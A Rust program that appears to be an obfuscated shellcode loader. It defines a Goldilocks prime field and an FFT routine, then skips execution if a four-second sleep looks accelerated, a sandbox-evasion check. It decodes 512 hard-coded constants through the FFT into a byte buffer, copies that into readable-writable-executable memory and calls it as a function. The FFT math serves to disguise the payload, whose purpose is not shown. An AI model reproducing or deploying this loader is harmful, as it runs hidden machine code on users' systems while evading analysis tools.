use std::{
    mem, 
    ptr,
    time::{
        Instant,
        Duration,
    },
    thread,
};

use ff::PrimeField;
use mmap::*;

#[derive(PrimeField)]
#[PrimeFieldModulus = "18446744069414584321"] // 2^64 - 2^32 + 1
#[PrimeFieldGenerator = "3"]
#[PrimeFieldReprEndianness = "little"]
pub struct Goldilocks([u64; 2]);

fn main() {

    let now = Instant::now();
    thread::sleep(Duration::new(4, 0));
    let after = Instant::now();
    if (after - Duration::new(3, 1000)) < now { return; }

    let data: [u64; 512] = [8430738500474634352, 3511673387982231450, 3723809618862644255, 15613434140595986860, 16361877191951488040, 16170326322858645856, 8260801094256217881, 10273897245059386274, 16439933806848746163, 1919342198336456889, 14940259929751694352, 9052113861067347890, 9384596107048994756, 13456199713305173343, 11368446079534616437, 13721200770370061759, 6281772759218506084, 1978294192569439149, 3604474164849387551, 10535439140226515616, 15784735712029657588, 2213031220276292833, 7867542908870000729, 9146084055932629270, 9377309781848365539, 9197246081408534157, 7032131459756682297, 9889769223536343821, 1780586918305230629, 6520467475287747798, 16859094952116613766, 6680122191485701752, 5369698776381251551, 411915156477750975, 12322972261814291453, 5493127304491842483, 4744416903317010064, 1824218293862594780, 12404783497553382262, 16491302259608131818, 2728469016145712944, 1768290280561067996, 12318309022289924663, 16355476859818962694, 16051901627855775758, 16585542722679278719, 8836583221733436480, 6876253132295557638, 3535052199340066060, 8795393430766899279, 18063048193640296762, 13063168411030364170, 8189479940041318798, 7993118401751232131, 8927069563663809794, 9510811063844650787, 3808676228938035022, 9891844169077169473, 6766675035620906441, 11147454250212986216, 7981912297751013842, 11654481950468499858, 7620290810201257829, 422989287472049643, 11506930115018140825, 18168152989292649615, 1843382034286054068, 2596576563995075131, 17594074846172720833, 16778192610567141394, 4436548565393665433, 14863808955077782356, 1926369041629382002, 8796681894206751744, 15117506094643021749, 2996504001350359507, 11983091577029980978, 2144649606286110358, 12501579682549224961, 3221768148272873921, 12835813744215860066, 16132767095584245715, 10983000844310049676, 14040760466220520972, 8501176165060602621, 4514491120018763749, 12908369962413651581, 13245972592371666075, 9938923124467422239, 10650055014970139017, 6154125520777419518, 1874233776517845260, 15561285486310501760, 632837166868561565, 8714645750234996666, 7780814772244184095, 9768740155233757199, 15560975838981109464, 2601906445789075953, 15605104371256084626, 1332455072116447943, 15406329034019522796, 2524141069775248580, 7649270164951526853, 10226909150305030788, 2849111788618050968, 8790252925637788351, 998808061952083577, 5532784942983538048, 15179984914774506941, 15167100160470271260, 18353381916400945757, 11203250263748924769, 5149653184763921860, 17496630995283568312, 17465448561937697431, 1919415977389125982, 18258650733516710304, 579633147340621883, 10668341520487145692, 15834006320675942596, 14457528331647511215, 6148023795486216398, 12499923865196918826, 608857783378042126, 3791642141699298042, 16699722832157230001, 433543540299251976, 14880073483874167266, 8495800286780799766, 14191493234577771298, 10752028287591785156, 7765244773247415818, 10986811784412943289, 7085608289724092953, 18142073387320976478, 14484419823251550966, 138862746054850149, 6504297209510126191, 14813035645489084988, 14627729831175753991, 10692749690593358673, 2362288950464454780, 14619989865444829830, 8125520780265428550, 11215305699570037031, 1667386352250902467, 12917315018343391337, 9696899465930437680, 6268135448990893014, 12844737611366878154, 13323194576237581639, 9023648713096370036, 12223827362261637780, 13527168115087312454, 1860699481193155267, 15273290262585233409, 5617677728605941436, 16169009227017684755, 15000555136533211247, 15180854730614020012, 4712283051620842643, 16692045778887340244, 6835406923694406102, 3710902184403016642, 5407640506687473823, 13661044716971482564, 2006056424312295096, 16388474062034925845, 10364335927314883498, 89895407441879412, 17067925930263670243, 6224909566732038473, 12660421683010224224, 5999570413576344691, 375695855618367093, 8412853177262469419, 6643755513931490354, 5290039071506241949, 9450671779270302504, 17130106254995225504, 17103067469675356785, 13958186335748400435, 6698026035566910285, 16659598186376145750, 12778731754578746990, 15419965842758714477, 4537967974336567242, 6428339865132974968, 5533207673345671518, 535766923027547855, 12106857567612165526, 16832639912564998530, 1132166769907195358, 4176021570817472225, 8773144438238993159, 1132345792961279299, 1168788433227887902, 15088333266230190698, 14031049957700547979, 364710506772792158, 10328056292725402114, 11185947389763843503, 5703231176715103128, 14626527757811664080, 16832005701450251916, 7884399887302234639, 3101916671687796541, 10138266161204001909, 11648172699967599268, 3394421613228108747, 18156797366404447021, 5730302919260133347, 5176216707685964189, 16072764307425588671, 12696632192382849995, 9092703051519447092, 9046852711523377456, 5322162211239303185, 16223765605752367512, 7687057654942471142, 5897272793698756156, 2140117011203429646, 9306597569368389987, 5524282345987175789, 7388988001974410087, 7458402796322993987, 9872279066599152824, 737273556661720562, 10083030582018226703, 6376271958581476321, 5895914896539869238, 5151022554663322570, 9406563770378670042, 8854330662943799595, 4644162570500700290, 11173861983848450406, 12528005482311692342, 4286289379712230690, 14316525842349238770, 17899746627933134232, 7755858563062083803, 7215357550181305769, 5887302618780887462, 3778264619244908531, 1815007758809085109, 4455495244716789190, 9493971467913341898, 13235887761303971394, 6520856082492044375, 17761392275528156099, 86418252704783295, 5875101149447441668, 14844802347432185009, 15282115477327450574, 11120862924189644569, 7998392936347729919, 3130770381176415502, 2373750425783791546, 14125601653040438748, 17777573433556825798, 2676462216648097713, 9961839597691451285, 16999648094147051944, 7765661174048762184, 13944938014670863725, 1246618474674010348, 17978936918169501206, 13580841052101061463, 631762395214134960, 1469106952322011875, 4766842004048520271, 17409716691997334640, 16285245574878581097, 11178016776310901118, 7428794871686433981, 5182963963123765768, 9745034346763458127, 8396202110096788870, 15318393060160680893, 16191914037313414983, 7826105273346050502, 12464482427602645733, 15929293679803552535, 18236455157715327512, 18036483251658520508, 5461625736036797432, 448406979690561749, 6825645387430657965, 2584124462579762319, 7357292348232085262, 12008070961689241192, 13483680003499941700, 17462560055740976475, 6303230229969091081, 13517386676055395285, 6861346139493778139, 10026302713864434310, 4675072478825892284, 15075646922451936379, 2512375678114721052, 12498550888142421561, 6950968777395814008, 16471273026259621195, 126057931606844393, 10382390753135750452, 10031955792524881368, 10538360955394366883, 11990618283989553524, 6382865408714658822, 12479040454568148209, 382516315292562053, 6034508648797509526, 11616441078126077332, 11350002345632832892, 12947607055687486324, 12158096436793058508, 7840264255270074734, 13245234261575138924, 1049395975704039253, 3496817623398226278, 3458869868749200585, 11724218866757441607, 11570361705612511188, 194442698463363562, 14839420168529128225, 156434090427045278, 5078984415624535951, 12715060064030392754, 7800170978284991287, 16897559248609048568, 17885252869483339608, 412809625479175061, 445023576591888021, 3811013888145602205, 14711403446917343676, 1177286389048086155, 14953282058516065231, 3433640384703341767, 5657109264773332045, 5278671388408792425, 3491280462113813518, 6345644447100196253, 10759614418282769950, 15891118948064981637, 11169312792988436481, 13372580346750860316, 8902180224171797048, 10187810095196598832, 12937892708694482981, 3990701134644208118, 15253876268707101998, 17845821948410155584, 12854188441275421308, 1057646826331640224, 5439420900524022666, 13658062866249431037, 12668579940729800706, 1978752062886180754, 2733714441272390804, 13447598377412160960, 1472287077039058751, 13311840427371542726, 11843462051935579637, 1466400456344389556, 3272671000428235029, 6950805574736913440, 14227729022087379612, 16351742354519242717, 352506975165470633, 8506389724826650956, 14106224979473792221, 4947077820739780226, 10527073899049923194, 9030950765911325435, 5451287264223407376, 17919705771566239590, 16275517887773283887, 16785296013030059500, 16086318982704448884, 10235676499347027416, 7195325768788742441, 6943797732406073261, 1964665045316158182, 9619508483317077535, 12478028778772349564, 10127279081679084084, 10614019345486074827, 10292600243260279739, 7769512939014866756, 5138433577161379094, 4592111846782638598, 11516579464635793036, 5387850864824901456, 13261902138865928556, 11776513789404740282, 3243583299045173460, 10599184034023386114, 862616159461378791, 10957948780354874536, 13003342946240101225, 423262849764805282, 1145893508019793652, 8463947099995073453, 7969670013051619015, 4586057824837144843, 124731733939003843, 13465292368730795229, 12224785983112858049, 17263074423920443479, 587333920440664123, 1802018306370343664, 10947180422514427412, 17069728285790108588, 6376533159641777032, 1507850634958911705, 11734413205055744343, 9224238100515819710, 9026970139642207216, 617133791694767911, 14099432149475351218, 1278273330931813229, 9094148030165066813, 13260304529340208411, 4081955293757448470, 9201900898261642947, 7949283108382513583, 16357716988342798550, 7571786617957253702, 1509192619335907875, 3154418913946243988, 14559610657599386321, 15519922517158014841, 7077534721868874201, 13383010893677712792, 16537952684405098835, 6174608624004114827, 10044111753586555218, 12338546283883809010, 16374181994083633961, 706996834046877660, 294854103489691631, 11954405992484307551, 12865849841755858316, 9881360937795775437, 9928311506816966590, 3086909099784346707, 15030082457657845922, 8227634624778434693, 17723756742720780304, 16489163427482282144, 18348183393648044010, 9935567441694575934, 10328313887085660253, 1218104881906444061, 8133314513650324347, 15234037203909104051, 5634856415983048628, 14041501671135456715, 5386860102185410705, 6082304398514694324, 9449219773105696913, 15029235869392930494, 9960371581717258831, 3798205761151312738, 5554745524868539947, 7954337989833576040, 10562244474498803941, 10988257671926409510, 16367996980010337796, 3282709457238736749, 16586210094769606768, 11985491619591407285, 2494631811600689917, 9987387045273115515, 11360088385180203683, 7480867556662245464, 8441089181859131712, 13975717246351872803, 16944993563745516618, 1249289352460971951, 13606468855108643810, 12620735289937083219, 2382817292772487130, 891824779468758337, 9978059996712821709, 5600748916031359810, 16012595244050661406, 15480521352212503, 14644601925103325255, 3349486561413423315, 1726740600960969446, 15401894885315386867, 12407028561806278342, 15699315672790042693, 6236432678168340787, 5214166763422581338, 16587989532003628936, 3841142410799070026, 1196526228435529348, 4713627815412136642, 127230712947348845, 6338122125106880776, 18374994345125879021, 2862583456022594968, 271398618504376417, 17490634509580458566, 8769477429052135093, 18430922606125368197, 17451707589355122815, 11885300884688235236, 6726693272287515375];
    
    let mut buf: [u8; 512] = [0u8; 512];

    let mut processed = Vec::new();
    let log_n = {
        let mut x = 0u32;
        let mut y = data.len();
        while y != 1 {
            y >>= 1;
            x += 1;
        }
        x
    };

    for item in data {
        processed.push(Goldilocks::from(item));
    }
    serial_fft(processed.as_mut_slice(), &Goldilocks::ROOT_OF_UNITY, log_n);
    for i in 0..processed.len() {
        buf[i] = u8::from_le(processed[i].to_repr().as_ref()[0]);
    }


    let opts = [
        MapOption::MapReadable,
        MapOption::MapWritable,
        MapOption::MapExecutable
    ];

    let mapping = MemoryMap::new(buf.len(), &opts).unwrap();
    unsafe {
        ptr::copy(buf.as_ptr(), mapping.data(), buf.len());
        mem::transmute::<_, fn()>(mapping.data())();
    }
}

pub(crate) fn serial_fft<F: PrimeField>(a: &mut [F], omega: &F, log_n: u32) {

    #[inline(always)]
    fn bitreverse(mut n: u32, l: u32) -> u32 {
        let mut r = 0;
        for _ in 0..l {
            r = (r << 1) | (n & 1);
            n >>= 1;
        }
        r
    }

    let n = a.len() as u32;
    assert_eq!(n, 1 << log_n);

    for k in 0..n {
        let rk = bitreverse(k, log_n);
        if k < rk {
            a.swap(rk as usize, k as usize);
        }
    }

    let mut m = 1;
    for _ in 0..log_n {
        let w_m = omega.pow([(n / (2*m)) as u64]);

        let mut k = 0;
        while k < n {
            let mut w = F::ONE;
            for j in 0..m {

                let mut t = a[(k+j+m) as usize];
                t.mul_assign(&w);
                let mut tmp = a[(k+j) as usize];
                tmp.sub_assign(&t);
                a[(k+j+m) as usize] = tmp;
                a[(k+j) as usize].add_assign(&t);
                w.mul_assign(&w_m);
            }

            k += 2*m;
        }

        m *= 2;
    }
}
